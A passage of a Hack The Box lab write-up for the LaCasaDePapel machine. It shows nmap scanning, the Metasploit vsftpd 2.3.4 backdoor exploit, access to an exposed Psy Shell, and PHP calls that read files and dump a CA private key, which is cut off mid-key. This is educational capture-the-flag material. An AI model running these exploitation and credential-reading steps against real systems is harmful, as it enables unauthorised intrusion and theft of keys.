<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - LaCasaDePapel - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-LaCasaDePapel"><a href="#Hack-The-Box-LaCasaDePapel" class="headerlink" title="Hack The Box - LaCasaDePapel"></a>Hack The Box - LaCasaDePapel</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today LaCasaDePapel retired and here’s my write-up about it. It was an easy interesting box, more of a ctf challenge than a realistic scenario but I still enjoyed it. It’s a Linux box and its ip is <code>10.10.10.131</code>, I added it to <code>/etc/hosts</code> as <code>lacasadepapel.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/lacasadepapel/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services :<br><code>nmap -sV -sT -sC lacasadepapel.htb</code><br><img src="/images/hackthebox/lacasadepapel/1.png" alt=""><br>We have <code>http</code> on port 80. <code>https</code> on port 443, <code>ftp</code> on port 21 and <code>ssh</code> on port 22.<br>Anonymous authentication wasn’t allowed on <code>ftp</code> so I checked <code>http</code> and <code>https</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;lacasadepapel# ftp lacasadepapel.htb</span><br><span class="line">Connected to lacasadepapel.htb.</span><br><span class="line">220 (vsFTPd 2.3.4)</span><br><span class="line">Name (lacasadepapel.htb:root): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">530 Login incorrect.</span><br><span class="line">Login failed.</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure>


<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p><code>http://lacasadepapel.htb</code><br><img src="/images/hackthebox/lacasadepapel/2.png" alt=""><br>We see an image of the characters from <a href="https://www.imdb.com/title/tt6468322/" target="_blank" rel="noopener">LaCasaDePapel</a> (TV show) and a QR code for <code>OTP</code>, I scanned it with <a href="https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&hl=en" target="_blank" rel="noopener">Google Authenticator</a> on my phone :<br><img src="/images/hackthebox/lacasadepapel/3.png" alt=""><br>As you can see I had to refresh it manually while other tokens refreshed automatically, no idea why but anyway I took the <code>OTP</code> and used <code>test@test.com</code> as email :<br><img src="/images/hackthebox/lacasadepapel/4.png" alt=""><br>Then nothing happened, I just got the same page back again. I tried <code>gobuster</code> to see if I can find any sub directories and I didn’t get anything useful. Let’s check <code>https</code>.<br><code>https://lacasadepapel.htb</code><br><img src="/images/hackthebox/lacasadepapel/5.png" alt=""><br>The same background with an error message saying : “Sorry, but you need to provide a client certificate to continue.”</p>
<h2 id="vsftpd-2-3-4-Psy-Shell"><a href="#vsftpd-2-3-4-Psy-Shell" class="headerlink" title="vsftpd 2.3.4, Psy Shell"></a>vsftpd 2.3.4, Psy Shell</h2><p>After hitting dead ends with web, I checked the <code>ftp</code> service again, the version was <code>vsftpd 2.3.4</code> (from the <code>nmap</code> scan) so I searched for exploits :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;lacasadepapel# searchsploit vsftpd 2.3.4</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                            |  Path</span><br><span class="line">                                                                                                                                                                          | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                    | exploits&#x2F;unix&#x2F;remote&#x2F;17491.rb</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>
<p>Command Execution and there is a <code>metasploit</code> module for it, but the exploit didn’t work :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search vsftpd 2.3.4</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                                      Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                                      ---------------  ----       -----  -----------</span><br><span class="line">   1  auxiliary&#x2F;gather&#x2F;teamtalk_creds                                            normal     No     TeamTalk Gather Credentials</span><br><span class="line">   2  exploit&#x2F;multi&#x2F;http&#x2F;oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution</span><br><span class="line">   3  exploit&#x2F;multi&#x2F;http&#x2F;struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection</span><br><span class="line">   4  exploit&#x2F;unix&#x2F;ftp&#x2F;vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit&#x2F;unix&#x2F;ftp&#x2F;vsftpd_234_backdoor</span><br><span class="line">msf5 exploit(unix&#x2F;ftp&#x2F;vsftpd_234_backdoor) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;unix&#x2F;ftp&#x2F;vsftpd_234_backdoor):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS                   yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT   21               yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(unix&#x2F;ftp&#x2F;vsftpd_234_backdoor) &gt; set rhosts 10.10.10.131</span><br><span class="line">rhosts &#x3D;&gt; 10.10.10.131</span><br><span class="line">msf5 exploit(unix&#x2F;ftp&#x2F;vsftpd_234_backdoor) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] 10.10.10.131:21 - Banner: 220 (vsFTPd 2.3.4)</span><br><span class="line">[*] 10.10.10.131:21 - USER: 331 Please specify the password.</span><br><span class="line">[+] 10.10.10.131:21 - Backdoor service has been spawned, handling...</span><br><span class="line">[-] 10.10.10.131:21 - The service on port 6200 does not appear to be a shell</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf5 exploit(unix&#x2F;ftp&#x2F;vsftpd_234_backdoor) &gt;</span><br></pre></td></tr></table></figure>
<p>Apparently there was another service running on port 6200, a quick <code>nmap</code> scan shows that the port is open :<br><img src="/images/hackthebox/lacasadepapel/6.png" alt=""><br>So I connected to that port with <code>nc</code> to see what’s there :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;lacasadepapel# nc lacasadepapel.htb 6200</span><br><span class="line">Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman</span><br></pre></td></tr></table></figure>
<p>The banner says <code>Psy Shell v0.9.9</code>, I didn’t know what <code>Psy Shell</code> was but a quick search and I found the <a href="https://psysh.org/" target="_blank" rel="noopener">website</a>. It’s a shell used for interactive <code>php</code> debugging and we can use it to execute <code>php</code>.<br>I tried to execute system commands but I couldn’t :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">"whoami"</span>)</span><br><span class="line">PHP Fatal error:  Call to undefined <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span> <span class="title">in</span> <span class="title">Psy</span> <span class="title">Shell</span> <span class="title">code</span> <span class="title">on</span> <span class="title">line</span> 1</span></span><br><span class="line"><span class="function"><span class="title">system</span><span class="params">(<span class="string">"whoami"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">PHP</span> <span class="title">Fatal</span> <span class="title">error</span>:  <span class="title">Call</span> <span class="title">to</span> <span class="title">undefined</span> <span class="title">function</span> <span class="title">system</span><span class="params">()</span> <span class="title">in</span> <span class="title">Psy</span> <span class="title">Shell</span> <span class="title">code</span> <span class="title">on</span> <span class="title">line</span> 1</span></span><br></pre></td></tr></table></figure>
<p>I tried to use <code>scandir()</code> to see the current directory listing and it worked :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">scandir(<span class="string">"."</span>)</span><br><span class="line">=&gt; [</span><br><span class="line">	 <span class="string">"."</span>,</span><br><span class="line">	 <span class="string">".."</span>,</span><br><span class="line">	 <span class="string">".DS_Store"</span>,</span><br><span class="line">	 <span class="string">"._.DS_Store"</span>,</span><br><span class="line">	 <span class="string">"bin"</span>,</span><br><span class="line">	 <span class="string">"boot"</span>,</span><br><span class="line">	 <span class="string">"dev"</span>,</span><br><span class="line">	 <span class="string">"etc"</span>,</span><br><span class="line">	 <span class="string">"home"</span>,</span><br><span class="line">	 <span class="string">"lib"</span>,</span><br><span class="line">	 <span class="string">"lost+found"</span>,</span><br><span class="line">	 <span class="string">"media"</span>,</span><br><span class="line">	 <span class="string">"mnt"</span>,</span><br><span class="line">	 <span class="string">"opt"</span>,</span><br><span class="line">	 <span class="string">"proc"</span>,</span><br><span class="line">	 <span class="string">"root"</span>,</span><br><span class="line">	 <span class="string">"run"</span>,</span><br><span class="line">	 <span class="string">"sbin"</span>,</span><br><span class="line">	 <span class="string">"srv"</span>,</span><br><span class="line">	 <span class="string">"swap"</span>,</span><br><span class="line">	 <span class="string">"sys"</span>,</span><br><span class="line">	 <span class="string">"tmp"</span>,</span><br><span class="line">	 <span class="string">"usr"</span>,</span><br><span class="line">	 <span class="string">"var"</span>,                           </span><br><span class="line">   ]</span><br></pre></td></tr></table></figure>
<p>I could list the directories in <code>/home</code> :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">scandir(<span class="string">"home/"</span>)</span><br><span class="line">=&gt; [</span><br><span class="line">     <span class="string">"."</span>,</span><br><span class="line">     <span class="string">".."</span>,</span><br><span class="line">     <span class="string">"berlin"</span>,</span><br><span class="line">     <span class="string">"dali"</span>,</span><br><span class="line">     <span class="string">"nairobi"</span>,</span><br><span class="line">     <span class="string">"oslo"</span>,</span><br><span class="line">     <span class="string">"professor"</span>,</span><br><span class="line">   ]</span><br></pre></td></tr></table></figure>
<p>Now we know the users on the box : <code>berlin</code>,<code>dali</code>,<code>nairobi</code>,<code>oslo</code> and <code>professor</code>.<br>I found the user flag in <code>/home/berlin</code>, however I got permission denied when I tried to read it :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">scandir(<span class="string">"home/berlin"</span>)</span><br><span class="line">=&gt; [</span><br><span class="line">     <span class="string">"."</span>,</span><br><span class="line">     <span class="string">".."</span>,</span><br><span class="line">     <span class="string">".ash_history"</span>,</span><br><span class="line">     <span class="string">".ssh"</span>,</span><br><span class="line">     <span class="string">"downloads"</span>,</span><br><span class="line">     <span class="string">"node_modules"</span>,</span><br><span class="line">     <span class="string">"server.js"</span>,</span><br><span class="line">     <span class="string">"user.txt"</span>,</span><br><span class="line">   ]</span><br><span class="line">readfile(<span class="string">"home/berlin/user.txt"</span>)</span><br><span class="line">PHP Warning:  readfile(home/berlin/user.txt): failed to open stream: Permission denied in phar:<span class="comment">//eval()'d code on line 1</span></span><br></pre></td></tr></table></figure>
<p>Same for <code>.ssh</code>, after a lot of failed attempts to get <code>RCE</code>, I looked at the <code>help</code> menu to see if there’s anything helpful:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">help</span><br><span class="line">  help       Show a list of commands. Type &#96;help [foo]&#96; for information about [foo].                                Aliases: ?  </span><br><span class="line">  ls         List local, instance or class variables, methods and constants.                                        Aliases: list, dir</span><br><span class="line">  dump       Dump an object or primitive.</span><br><span class="line">  doc        Read the documentation for an object, class, constant, method or property.                             Aliases: rtfm, man  </span><br><span class="line">  show       Show the code for an object, class, constant, method or property.</span><br><span class="line">  wtf        Show the backtrace of the most recent exception.                                                       Aliases: last-exception, wtf?</span><br><span class="line">  whereami   Show where you are in the code.</span><br><span class="line">  throw-up   Throw an exception or error out of the Psy Shell.</span><br><span class="line">  timeit     Profiles with a timer.</span><br><span class="line">  trace      Show the current call stack.</span><br><span class="line">  buffer     Show (or clear) the contents of the code input buffer.                                                 Aliases: buf</span><br><span class="line">  clear      Clear the Psy Shell screen.</span><br><span class="line">  edit       Open an external editor. Afterwards, get produced code in input buffer.</span><br><span class="line">  sudo       Evaluate PHP code, bypassing visibility restrictions.</span><br><span class="line">  history    Show the Psy Shell history.                                                                            Aliases: hist</span><br><span class="line">  exit       End the current session and return to caller.                                                          Aliases: quit, q</span><br></pre></td></tr></table></figure>
<p>I used <code>ls</code> to see what variables are there :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">Variables: $tokyo</span><br></pre></td></tr></table></figure>
<p>There was only one variable called <code>tokyo</code> , let’s check that variable:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show $tokyo</span><br><span class="line">  &gt; <span class="number">2</span>| <span class="class"><span class="keyword">class</span> <span class="title">Tokyo</span> </span>&#123;</span><br><span class="line">    <span class="number">3</span>|  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sign</span><span class="params">($caCert,$userCsr)</span> </span>&#123;</span><br><span class="line">    <span class="number">4</span>|          $caKey = file_get_contents(<span class="string">'/home/nairobi/ca.key'</span>);</span><br><span class="line">    <span class="number">5</span>|          $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, <span class="number">365</span>, [<span class="string">'digest_alg'</span>=&gt;<span class="string">'sha256'</span>]);</span><br><span class="line">    <span class="number">6</span>|          openssl_x509_export($userCert, $userCertOut);</span><br><span class="line">    <span class="number">7</span>|          <span class="keyword">return</span> $userCertOut;</span><br><span class="line">    <span class="number">8</span>|  &#125;</span><br><span class="line">    <span class="number">9</span>| &#125;</span><br></pre></td></tr></table></figure>
<p>The function <code>sign()</code> is using the private key <code>/home/nairobi/ca.key</code>, we can grab that key and create a client certificate to access the <code>https</code> service we couldn’t access before. </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(<span class="string">'/home/nairobi/ca.key'</span>);</span><br><span class="line">=&gt; <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">   -----BEGIN PRIVATE KEY-----\n</span></span><br><span class="line"><span class="string">   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n</span></span><br><span class="line"><span class="string">   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n</span></span><br><span class="line"><span class="string">   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n</span></span><br><span class="line"><span class="string">   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n</span></span><br><span class="line"><span class="string">   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n</span></span><br><span class="line"><span class="string">   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n</span></span><br><span class="line"><span class="string">   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n</span></span><br><span class="line"><span class="string">   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n</span></span><br><span class="line"><span class="string">   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n</span></span><br><span class="line"><span class="string">   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n</span></span><br><span class="line"><span class="string">   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n</span></span><br><span class="line"><span class="string">   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n</span></span><br><span class="line"><span class="string">   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n</span></span><br><span class="line"><span class="string">   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n</span></span><br><span class="line"><span class="string">   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n</span></span><br><span class="line"><span class="string">   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n</span></span><br><span class="line"><span class="string">   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n</span></span><br><span class="line"><span class="string">   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n</span></span><br><span class="line"><span class="string">   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n</span></span><br><span class="line"><span class="string">   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n</span></span><br><span 